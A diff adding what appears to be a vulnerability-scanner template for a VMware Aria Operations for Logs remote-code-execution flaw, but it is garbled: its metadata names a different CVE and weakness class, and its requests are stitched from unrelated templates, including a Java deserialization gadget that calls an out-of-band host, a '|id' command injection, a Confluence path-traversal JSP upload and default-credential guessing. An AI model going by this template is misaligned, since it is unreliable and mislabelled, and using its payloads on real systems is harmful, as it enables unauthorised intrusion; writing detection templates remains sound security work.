@@ -1,0 +1,194 @@
+id: CVE-2023-20864
+
+info:
+  name: VMware Aria Operations for Logs - Unauthenticated Remote Code Execution
+  author: rootxharsh,iamnoooob,pdresearch
+  severity: high
+  description: |
+    VMware Aria Operations for Logs contains a deserialization vulnerability. An unauthenticated, malicious 
+  reference:
+    - https://www.vmware.com/security/advisories/VMSA-2023-0007.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2023-20864
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 8.8
+    cve-id: CVE-2022-34753
+    cwe-id: CWE-78
+    epss-score: 0.96979
+  metadata:
+    max-request: 2 # 表示需要请求数为2,看以下http:raw
+    shodan-query: title:"vRealize Log Insight"
+    verified: true
+  remediation: Ensure proper access or disable completely.
+  tags: cve,cve2023,vmware,aria,rce,oasts
+
+self-contained: true
+
+variables:
+  num1: "{{rand_int(800000, 999999)}}"
+  num2: "{{rand_int(800000, 999999)}}"
+  result: "{{to_number(num1)*to_number(num2)}}"
+
+variables:
+  username: "{{username}}"
+  password: "{{password}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/install/"
+      - "{{BaseURL}}/api/v1/GetDevice"
+    headers:
+      Accept-Encoding: deflate
+      Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "/view/js/xiuno.js"
+          - "Choose Language (选择语言)"
+        condition: and
+
+  - raw:
+      - |
+        GET /csrf HTTP/1.1
+        Host: {{Hostname}}
+        X-Csrf-Token: Fetch
+
+      - |
+        POST /api/v2/internal/cluster/applyMembership HTTP/1.1
+        Host: {{Hostname}}
+        X-CSRF-Token: {{xcsrftoken}}
+        Content-type: application/octet-stream
+
+        {{generate_java_gadget("dns", "http://{{interactsh-url}}", "raw")}}
+
+      - |
+        GET /delsnap.pl?name=|id HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{base64('{{username}}:' + '{{password}}')}}
+
+      - |
+        POST /users/sign_in HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Origin: {{BaseURL}}
+        DNT: 1
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}/users/sign_in
+        Accept-Language: en-US,en;q=0.9,de;q=0.8
+
+        authenticity_token={{url_encode(authenticity_token)}}&user%5Blogin%5D={{username}}&user%5Bpassword%5D={{password}}&user%5Bremember_me%5D=0
+
+      - |
+        POST /plugins/drag-and-drop/upload.action?draftId={{draftID}}&filename=../../../../../../opt/atlassian/confluence/confluence/pages/{{randstr}}.jsp&size=8&mimeType=text%2Fplain&atl_token={{csrftoken}} HTTP/1.1
+        Host: {{Hostname}}
+
+        ${{{num1}}*{{num2}}}
+
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json
+
+        {"userName":"{{user}}","password":"{{pass}}"}
+
+    attack: pitchfork
+    payloads:
+      user:
+        - admin
+        - engineer
+        - guest
+      pass:
+        - cs141-snmp
+        - engineer
+        - guest
+
+    stop-at-first-match: true
+    cookie-reuse: true
+    host-redirects: true
+    max-redirects: 2
+    matchers-condition: and
+    req-condition: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        part: body
+        words:
+          - "<?php"
+          - '"errorMessage":"Internal error'
+        condition: and
+
+      - type: regex
+        regex:
+          - 'uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)'
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body_5
+        words:
+          - "{{result}}"
+
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(body_1, "htmoffice operate")'
+          - 'contains(body_2, "Windows IP")'
+        condition: and
+
+    threads: 30
+    cookie-reuse: true
+    extractors:
+      - type: kval
+        internal: true
+        name: xcsrftoken
+        group: 1
+        kval:
+          - "X_CSRF_Token"
+
+      - type: regex
+        name: date
+        part: body
+        group: 1
+        regex:
+          - '(\d{4}-\d{2}-\d{2})\\/([a-f0-9]+\.txt)'
+        internal: true
+        
+      - type: regex
+        name: file
+        part: body
+        group: 2
+        regex:
+          - '(\d{4}-\d{2}-\d{2})\\/([a-f0-9]+\.txt)'
+        internal: true
+
+      - type: xpath
+        name: authenticity_token
+        part: body
+        attribute: value
+        internal: true
+        xpath:
+          - /html/body/div/div[2]/div/form/input[2]
+
+      - type: regex
+        part: body
+        name: csrftoken
+        internal: true
+        group: 1
+        regex:
+          - 'name="atlassian\-token" content="([a-z0-9]+)"> '
